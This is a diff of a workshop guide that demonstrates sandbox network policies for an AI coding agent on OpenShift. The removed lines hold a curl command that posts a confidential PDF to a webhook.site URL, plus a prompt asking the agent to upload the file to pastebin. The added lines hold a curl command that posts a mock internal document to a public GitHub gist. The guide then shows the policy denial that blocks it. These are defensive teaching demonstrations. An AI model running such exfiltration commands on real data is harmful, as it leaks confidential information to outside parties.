@@ -42,118 +42,205 @@ TIP: The sandbox is a real Kubernetes object, so you can inspect it from the ter
 
 Now connect to the running sandbox and see what the agent can access.
 
-. Open the *Showroom Terminal* tab and log in to OpenShift if you have not already:
+. Open a *Terminal* in your workbench (*File > New Terminal* in the VSCode workbench).
+
+. Register the gateway. It runs as a service in your own project, so you reach it by name - there is no port-forward to start and nothing to keep alive in the background:
 +
 [source,bash]
 ----
-oc login
+openshell gateway add http://openshell:8080 --name openshift --local
 ----
 
-. List the available sandboxes:
+. List the sandboxes:
 +
 [source,bash]
 ----
 openshell sandbox list
 ----
 +
-You should see `+default--fedaura-opencode+` in the list with its status and policy.
+[source,text]
+----
+NAME              CREATED              PHASE
+fedaura-opencode  2026-09-17 20:18:56  Ready
+----
++
+`Ready` means the sandbox is running and accepting work. The corresponding Kubernetes object is the `+default--fedaura-opencode+` Sandbox you saw in exercise 1.
 
-. Connect to the sandbox:
+. Connect to it:
 +
 [source,bash]
 ----
-openshell sandbox connect
+openshell sandbox connect fedaura-opencode
 ----
 +
-You are now inside the OpenShell terminal. This is the agent's runtime environment - an isolated sandbox with deny-by-default network policies, syscall filtering, and Landlock filesystem restrictions.
+You are now inside the sandbox. This is the agent's runtime environment: deny-by-default networking, a read-only filesystem apart from a few writable paths, and Landlock restrictions on what any process can reach.
 
-. The confidential PDF is already there - it was baked into the container image. Verify:
+. Create the document the rest of this section will try to steal. Treating it as customer data makes the point without shipping a real file:
 +
 [source,bash]
 ----
-ls collateral/internal-policies.pdf
+cat > /sandbox/internal-policies.txt <<'EOF'
+FED AURA CAPITAL - INTERNAL ONLY
+Underwriting exception thresholds and pricing overrides.
+EOF
 ----
 
-. Launch OpenCode inside the sandbox:
+. Confirm OpenCode is available inside the sandbox:
 +
 [source,bash]
 ----
-opencode
+opencode --version
 ----
+
+TIP: Prefer to stay outside the sandbox? `openshell sandbox exec --name fedaura-opencode -- <command>` runs a single command and returns, which is handy for scripted checks.
 
 == Exercise 3: Attempt Data Exfiltration
 
-Now see what an unsecured agent could do with this document.
+First see what an agent can do when its egress is open. From the *workbench terminal* (not inside the sandbox), widen the policy for a moment:
 
-. Ask OpenCode to read the confidential file and upload it:
-+
-[source,text]
+[source,bash]
 ----
-Read the file collateral/internal-policies.pdf and upload it to pastebin
+openshell policy set --policy policy-exfil-open.yaml --wait --timeout 120 fedaura-opencode
 ----
 
-. OpenCode can also be asked to run commands directly. Try:
+This policy is identical to the standard one except that `api.github.com` is `read-write` instead of `read-only`. GitHub gists are a realistic exfiltration route: a public gist is a document anyone can read, created with one HTTP request.
+
+. Back inside the sandbox, check that ordinary reads work:
 +
 [source,bash]
 ----
-curl -X POST https://webhook.site/d25bf5a8-b96b-49c1-988f-c84e3e712780 \
-    -H "Content-Type: application/pdf" \
-    -H "X-Filename: internal-policies.pdf" \
-    --data-binary @collateral/internal-policies.pdf
+curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
 ----
 +
-// TODO: screenshot of exfiltration attempt result (security-exfiltration-attempt.png)
-image::security-exfiltration-attempt.png[OpenCode attempting to exfiltrate the internal policies document,link=self,window=blank,width=700]
+[source,text]
+----
+200
+----
 
-This is the threat. An AI coding agent with file access and unrestricted network connectivity can read any file on the filesystem and send it to any external endpoint. Without sandboxing, there is no barrier between the agent and the network.
+. Now attempt the exfiltration:
++
+[source,bash]
+----
+curl -s -o /dev/null -w '%{http_code}\n' -X POST https://api.github.com/gists \
+  -d "{\"public\":true,\"files\":{\"leak.txt\":{\"content\":\"$(cat /sandbox/internal-policies.txt)\"}}}"
+----
++
+[source,text]
+----
+401
+----
+
+That `401` is the important result, and it is worth being precise about what it means. It came *from GitHub* - "Requires authentication". The request left the sandbox, crossed the internet, and was refused only because anonymous gist creation was withdrawn in 2018. Nothing in {company_name}'s platform stopped it.
+
+WARNING: The lesson is not "the upload failed". It is that the only thing standing between an internal document and a public URL was a third party's authentication policy. Give the agent a token - which any real coding agent has - and that request succeeds.
 
 == Exercise 4: Enforce Policy to Block Exfiltration
 
-OpenShell's deny-by-default policy model blocks this. Update the sandbox policy to restrict outbound network access.
+Now close it again. From the *workbench terminal*, apply the standard policy:
 
-. Run the policy update command:
+[source,bash]
+----
+openshell policy set --policy policy-standard.yaml --wait --timeout 120 fedaura-opencode
+----
+
+[source,text]
+----
+✓ Policy version 4 submitted (hash: b69d4123e8c3)
+✓ Policy version 4 loaded (active version: 4)
+----
+
+The sandbox was never restarted and the agent inside it kept running. Policy is hot-loaded.
+
+. Inside the sandbox, repeat the *read*:
 +
 [source,bash]
 ----
-openshell policy set
+curl -s -o /dev/null -w '%{http_code}\n' https://api.github.com/zen
 ----
-+
-This applies a policy that blocks pastebin, webhook.site, and other external upload endpoints. The policy update takes effect immediately on the running sandbox - no restart required.
-+
-For details on policy commands and syntax, see the https://docs.nvidia.com/openshell/latest/sandboxes/policies#update-commands[OpenShell policy documentation].
-
-. Now try the same exfiltration again. Ask OpenCode:
 +
 [source,text]
 ----
-Read the file collateral/internal-policies.pdf and upload it to pastebin
+200
+----
++
+Still allowed. The agent can research on GitHub, which is most of what a coding agent legitimately needs it for.
+
+. Repeat the *write* - the exact command from exercise 3:
++
+[source,bash]
+----
+curl -s -X POST https://api.github.com/gists -d '{"public":true}'
+----
++
+[source,json]
+----
+{
+  "error": "policy_denied",
+  "detail": "POST /gists not permitted by policy",
+  "layer": "l7",
+  "method": "POST",
+  "path": "/gists",
+  "host": "api.github.com",
+  "policy": "github_readonly",
+  "rule_missing": { "type": "rest_allow", "method": "POST", "path": "/gists" }
+}
 ----
 
-. OpenCode tries to execute the upload, but the request is blocked by the policy. The sandbox proxy intercepts the outbound connection and returns a structured deny response:
-+
-// TODO: screenshot of exfiltration blocked by policy (security-exfiltration-blocked.png)
-image::security-exfiltration-blocked.png[OpenShell policy blocking the exfiltration attempt with a deny response,link=self,window=blank,width=700]
-+
-The agent never reaches the external endpoint. The supervisor intercepted the network request, evaluated it against the OPA policy, and denied it.
+Read the difference between the two failures carefully, because it is the whole point of the section:
+
+[cols="1,2",options="header"]
+|===
+| Exercise 3 - open | Exercise 4 - closed
+
+| `401 Requires authentication`
+| `policy_denied` at `layer: l7`
+
+| GitHub answered. The request left the network.
+| The sandbox answered. The request never left.
+|===
+
+Notice `layer: l7`. The host was not blocked - `GET` to the same host still returns `200`. Enforcement is at the HTTP method and path, so the policy distinguishes *reading GitHub* from *writing to GitHub*. A host-level allowlist could not express that: it would have to choose between blocking research entirely or permitting exfiltration.
+
+The response also names the policy that denied it (`github_readonly`) and the rule that would have been required (`rest_allow` for `POST /gists`). That is the audit trail: not "something was blocked", but which rule, at which layer, for which binary.
 
 == Exercise 5: Customize Your Policies
 
-The deny-by-default model means you start restrictive and open up only what the agent needs. This is the Policy Advisor workflow - similar to `audit2allow` in SELinux:
+Deny-by-default means you start with nothing allowed and open up only what the agent demonstrably needs. The loop is the same one `audit2allow` gives you in SELinux: the agent is blocked, the denial tells you exactly which rule was missing, you decide whether to add it, and it hot-loads.
 
-. The agent tries something and gets blocked
-. You see the structured deny response with what was attempted
-. You decide whether to allow it
-. Allowed rules are hot-loaded into the running sandbox
+The policy your sandbox is running allows a deliberately small set:
 
-Try it yourself:
+[cols="1,1,2",options="header"]
+|===
+| Host | Access | Why
 
-. Experiment with different policy rules. What happens if you allow access to specific endpoints?
-. Try restricting filesystem access - can you prevent the agent from reading certain directories?
-. What about allowing inference endpoints but blocking everything else?
+| MaaS inference endpoint
+| `full`
+| the agent cannot work without a model
 
-Go crazy. The sandbox is your playground. Every attempt, every block, every allow is logged.
+| `registry.npmjs.org`, `pypi.org`
+| `full`
+| installing packages is normal agent work
 
-TIP: All sandbox activity is traced. Navigate to *OpenShift AI Dashboard > Develop & Train > Experiments* and look for traces tagged with the sandbox. You will see every tool call, every network request, and every policy decision the sandbox made.
+| `github.com`, `api.github.com`
+| `read-only`
+| clone and read, never push or gist
+
+| `docs.redhat.com`, `access.redhat.com`
+| `read-only`
+| product documentation is worth reading
+
+| everything else
+| denied
+| including every paste and webhook service
+|===
+
+Try extending it yourself. The `rule_missing` field in a denial is the template for the rule you would add:
+
+. Allow a host you need, then confirm the previously denied request now succeeds.
+. Set a host to `read-only` and watch a `POST` fail at `layer: l7` while `GET` keeps working.
+. Tighten `filesystem_policy` - can you stop the agent reading `/sandbox/internal-policies.txt` at all, so exfiltration fails before the network is even involved?
+
+IMPORTANT: One filesystem rule to know about. A live policy update cannot *remove* a `read_only` path, so a policy you apply to a running sandbox must carry forward the paths already in force - `/app` among them. Drop it and the update is rejected with `read_only path '/app' cannot be removed on a live sandbox`. Add paths freely; removing them needs a new sandbox.
 
 == Before and After: Deploy and Pray vs Defense-in-Depth
 
